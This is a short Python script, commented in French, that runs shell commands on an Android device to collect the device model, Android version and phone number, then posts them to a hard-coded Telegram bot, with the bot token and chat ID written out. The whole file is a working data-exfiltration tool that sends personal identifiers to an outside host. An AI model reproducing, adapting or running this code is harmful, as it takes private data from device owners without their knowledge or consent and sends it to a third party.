import subprocess
import http.client
import urllib.parse

# Fonction pour exécuter une commande shell et retourner la sortie
def run_command(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.stdout.decode('utf-8').strip()

# Récupérer des informations de base
device_name = run_command("getprop ro.product.model")
android_version = run_command("getprop ro.build.version.release")
phone_number = run_command("service call iphone 8 | grep 'result=' | cut -d' ' -f2")

# Préparer le message à envoyer
message = (f"Nom de l'appareil: {device_name}\n"
           f"Version d'Android: {android_version}\n"
           f"Numéro de téléphone: {phone_number}")

# URL de l'API Telegram pour envoyer un message
telegram_api_url = "api.telegram.org"
bot_token = "8468165702:AAHD08K4JugVPyCze00j1qbluTs6iyjf1mw"
chat_id = "8012856656"

# Préparer les paramètres pour l'appel API
params = urllib.parse.urlencode({'chat_id': chat_id, 'text': message})

# Créer une connexion HTTP
conn = http.client.HTTPSConnection(telegram_api_url)

# Envoyer le message via l'API Telegram
conn.request("POST", f"/bot{bot_token}/sendMessage", params)

# Obtenir la réponse
response = conn.getresponse()

# Vérifier la réponse
if response.status == 200:
    print("Message envoyé avec succès!")
else:
    print(f"Échec de l'envoi du message. Code de statut: {response.status}")
